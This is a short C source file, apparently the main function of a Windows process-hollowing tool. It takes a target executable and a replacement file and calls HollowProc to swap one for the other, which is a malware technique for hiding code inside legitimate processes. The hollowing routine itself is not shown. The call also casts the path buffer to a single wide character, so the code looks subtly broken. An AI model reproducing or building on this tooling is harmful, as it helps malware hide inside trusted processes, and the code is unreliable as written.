#include "hollow.h"

int main(int argc, char *argv[])
{
	if (argc < 3)
	{
		info("Usage: hollow.exe <exe name> <replacement file>");
		return EXIT_FAILURE;
	}

	// set current directory to where EXE is
	wchar_t path[MAX_PATH];
	GetModuleFileName(NULL, path, _countof(path));
	*wcsrchr(path, L'\\') = 0;
	SetCurrentDirectory(path);

	if (!HollowProc(argv[1], argv[2], (wchar_t)path))
	{
		warn("Process Hollowing FAILED!");
		return EXIT_FAILURE;
	}

	okay("Process Hollowing SUCCESS!");

	return EXIT_SUCCESS;
}